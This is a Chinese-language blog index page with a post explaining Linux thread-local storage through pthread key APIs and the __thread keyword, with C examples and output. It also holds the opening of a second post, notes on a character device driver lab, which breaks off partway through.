<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/13/Linux%20TLS%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/13/Linux%20TLS%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8/" class="post-title-link" itemprop="url">Linux TLS线程局部存储</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-13 22:03:35 / Modified: 22:04:54" itemprop="dateCreated datePublished" datetime="2022-10-13T22:03:35+08:00">2022-10-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>基础知识</strong></p>
<p>在多线程的程序中，进程中的全局变量与函数内定义的静态(static)变量，是各个线程都可以访问的共享变量，因此往往会有资源条件竞争的问题，常见的处理办法就是使用同步机制来维护资源</p>
<p>线程局部存储（Thread Local Storage，TLS）是一种另类的解决方式：</p>
<ul>
<li>它存储和维护一些线程相关的数据，存储的数据会被关联到当前线程中去，并不需要锁来维护</li>
<li>本质上是为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突 </li>
</ul>
<p><strong>TLS实现方式：API</strong></p>
<p>Linux 中相关的 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_create</span><span class="params">(<span class="keyword">pthread_key_t</span> *key, <span class="keyword">void</span> (*destructor)(<span class="keyword">void</span>*))</span></span>; <span class="comment">/* 构建一个pthread_key_t类型,确实是相当于一个key */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_delete</span><span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>; <span class="comment">/* 注销一个pthread_key_t */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">pthread_getspecific</span><span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>; <span class="comment">/* 将与pthread_key_t相关联的数据读出来 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_setspecific</span><span class="params">(<span class="keyword">pthread_key_t</span> key, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span>; <span class="comment">/* 用于将value的副本存储于一数据结构中,并将其与调用线程以及pthread_key_t相关联 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>结构关系图如下：</li>
</ul>
<img src="/2022/10/13/Linux%20TLS%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8/1665655683859.png" class width="1665655683859"> 
<p>本人在实际操作这些 API 时遇到了许多问题，先看一个失败的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_key_t</span> p_key;  </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">(<span class="keyword">void</span> *args)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d is runing in %s\n&quot;</span>,*(<span class="keyword">int</span>*)args,__func__);  </span><br><span class="line">    *(<span class="keyword">int</span>*)args = *(<span class="keyword">int</span>*)args + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d is runing in %s\n&quot;</span>,*(<span class="keyword">int</span>*)args,__func__);  </span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)<span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">pthread_t</span> p[<span class="number">24</span>]; </span><br><span class="line">    pthread_key_create(&amp;p_key,<span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">int</span> *a = (<span class="keyword">int</span>*)pthread_getspecific(p_key);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    pthread_setspecific(p_key, a); </span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;p[i], <span class="literal">NULL</span>,thread_func,a);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line"><span class="number">1</span> is runing in thread_func</span><br><span class="line"><span class="number">2</span> is runing in thread_func</span><br><span class="line"><span class="number">1</span> is runing in thread_func</span><br><span class="line"><span class="number">2</span> is runing in thread_func</span><br><span class="line"><span class="number">3</span> is runing in thread_func</span><br><span class="line"><span class="number">5</span> is runing in thread_func</span><br><span class="line"><span class="number">3</span> is runing in thread_func</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<ul>
<li>位于堆区的 <code>a</code> 本来应该充当 TLS 的作用，但各个线程好像还是共用了同一片空间</li>
<li><code>pthread_setspecific</code> 对主线程进行了绑定，而忽略了其他线程（其实我还有多个测试案例：把 <code>pthread_setspecific</code> 放到线程函数里面，使用不同的 <code>pthread_key_t</code> 变量 …… 但这些操作都失败了）</li>
<li>其实这里是我的理解有误区，认为这些 API 函数会自动帮我为不同的线程复制数据</li>
</ul>
<p>接下来看一个成功的案例：（错误码 errno 的实现原理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_deal_func</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	TASK_NUM	2</span></span><br><span class="line"><span class="keyword">pthread_t</span> global_thread_no[TASK_NUM];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_key_t</span> key;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_once_t</span> key_once = PTHREAD_ONCE_INIT;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">make_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) pthread_key_create(&amp;key, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> * _errno()&#123;</span><br><span class="line">    <span class="keyword">int</span> *ptr;</span><br><span class="line">    (<span class="keyword">void</span>) pthread_once(&amp;key_once, make_key);</span><br><span class="line">    <span class="keyword">if</span> ((ptr = pthread_getspecific(key)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));       </span><br><span class="line">        (<span class="keyword">void</span>) pthread_setspecific(key, ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	errno_test *_errno()	</span></span><br><span class="line"><span class="comment">//int errno_test = 0;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	errno_test = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">int</span> tmp = <span class="number">0</span>,i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; TASK_NUM; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>((tmp=pthread_create(&amp;global_thread_no[i],<span class="literal">NULL</span>,thread_deal_func,&amp;i))!= <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t create thread: %s\n&quot;</span>,strerror(tmp));</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;man thread     ,errno_test:%d\n&quot;</span>,errno_test);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_deal_func</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number = *(<span class="keyword">int</span>*)arg;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		errno_test += <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;thread number:%d,errno_test:%d\n&quot;</span>,number,errno_test);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 TLS：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">1</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">1</span></span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">2</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">2</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">3</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">3</span></span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">4</span></span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">4</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用全局变量：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">101</span></span><br><span class="line">man thread     ,errno_test:<span class="number">101</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">102</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">103</span></span><br><span class="line">man thread     ,errno_test:<span class="number">103</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">104</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">105</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">106</span></span><br><span class="line">man thread     ,errno_test:<span class="number">106</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 <code>errno_test</code> 看起来像是全局变量，其实是一个函数的返回值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	errno_test *_errno()</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每次使用 <code>errno_test</code> 时，都会调用 <code>_errno()</code> 函数</li>
<li>在其中会申请与当前线程绑定的变量，并且调用 <code>malloc</code> 为其分配空间：<ul>
<li>对于各个线程来说，这些变量的地址不同了</li>
<li>对于用户来说，各个线程拿到不同的变量，不会相互干扰</li>
</ul>
</li>
</ul>
<p><strong>TLS实现方式：关键字</strong></p>
<p>在 Linux 中还有一种更为高效的线程局部存储方法，就是使用关键字 <code>__thread</code> 来定义变量</p>
<ul>
<li>凡是带有 <code>__thread</code> 的变量，每个线程都拥有该变量的一份拷贝，且互不干扰</li>
<li>线程局部存储中的变量将一直存在，直至线程终止，当线程终止时会自动释放这一存储 </li>
</ul>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__thread <span class="keyword">int</span> var = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">task_entry</span><span class="params">(<span class="keyword">void</span>* arg)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> idx = (<span class="keyword">int</span>)arg;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;addr : %p\n&quot;</span>,&amp;var);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread:%d  var = %d\n&quot;</span>, idx, var += idx); </span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">    <span class="keyword">pthread_t</span> pid1,pid2;  </span><br><span class="line">    pthread_create(&amp;pid1,<span class="literal">NULL</span>,task_entry,(<span class="keyword">void</span> *)<span class="number">1</span>);  </span><br><span class="line">    pthread_create(&amp;pid2,<span class="literal">NULL</span>,task_entry,(<span class="keyword">void</span> *)<span class="number">2</span>);  </span><br><span class="line">    pthread_join(pid1,<span class="literal">NULL</span>);  </span><br><span class="line">    pthread_join(pid2,<span class="literal">NULL</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line">addr : <span class="number">0x7f20b3ebe6fc</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">1</span></span><br><span class="line">addr : <span class="number">0x7f20b36bd6fc</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">2</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">2</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">4</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">6</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">3</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">4</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">8</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">10</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>两个线程并不会干扰，而且地址也不同</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/13/Linux-Lab3-Character%20device%20drivers/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/13/Linux-Lab3-Character%20device%20drivers/" class="post-title-link" itemprop="url">Linux-Lab3-Character device drivers</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-13 01:10:24" itemprop="dateCreated datePublished" datetime="2022-10-13T01:10:24+08:00">2022-10-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-14 20:55:38" itemprop="dateModified" datetime="2022-10-14T20:55:38+08:00">2022-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Character device drivers</strong></p>
<p>实验室目标：</p>
<ul>
<li>了解字符设备驱动程序背后的概念</li>
<li>了解可以在字符设备上执行的各种操作</li>
<li>使用等待队列</li>
</ul>
<p>设备驱动程序是与硬件设备交互的内核组件（通常是模块）</p>
<p>在UNIX中有两类设备文件：</p>
<ul>
<li>第一类设备，字符设备：（例如：键盘、鼠标、串行端口、声卡、操纵杆）<ul>
<li>慢速设备</li>
<li>管理少量数据</li>
<li>访问数据不需要频繁的查找查询</li>
<li>通常，这些设备的 Read/Write 是按字节顺序执行</li>
</ul>
</li>
<li>第二类设备，块设备：（例如：硬盘驱动器、光盘、RAM 磁盘、磁带驱动器）<ul>
<li>数据量大</li>
<li>数据按块组织</li>
<li>搜索频繁</li>
<li>对于这些设备，Read/Write 是在数据块级别完成的</li>
</ul>
</li>
</ul>
<p>因此，UNIX 提供了两种设备驱动程序：</p>
<ul>
<li>字符驱动 - character driven </li>
<li>块驱动 - block driven </li>
<li>PS：Linux中还有一种网络驱动 - plot driven（不是本篇文章的重点）</li>
</ul>
<p>对于这两种类型的设备驱动程序，Linux 内核提供了不同的 API，其中大多数参数都有直接含义：</p>
<ul>
<li><code>file</code> 和 <code>inode</code>：标识设备类型文件</li>
<li><code>size</code>：要读取或写入的字节数</li>
<li><code>offset</code>：要读取或写入的位移（将相应更新）</li>
<li><code>user_buffer</code>：从中 Read/Write 的用户缓冲区</li>
<li><code>whence</code>：搜索方式（搜索操作开始的位置）</li>
<li><code>cmd</code> 和 <code>arg</code>：用户发送到 ioctl 调用的参数（IO控制）</li>
</ul>
<p><strong>Majors and Minors</strong></p>
<p>Linux 中，设备具有与之关联的唯一固定标识符，由两部分组成：major and minor</p>
<ul>
<li>major：标识设备的类型（IDE 磁盘、SCSI 磁盘、串行端口等）</li>
<li>minor：标识具体的设备（第一个磁盘、第二个串行端口等）</li>
</ul>
<p>PS：因为物理设备已经被驱动抽象为“在 Linux 上运行的软件”，所以 Linux 可以通过这种方式定位具体的物理设备</p>
<p><strong>Inode and File</strong></p>
<p>从文件系统的角度来看，<code>inode</code> 表示文件：</p>
<ul>
<li><code>inode</code> 的属性是与文件关联的大小，权限，时间</li>
<li><code>inode</code> 唯一标识文件系统中的文件</li>
</ul>
<p>从用户的角度来看，<code>file</code> 表示文件：</p>
<ul>
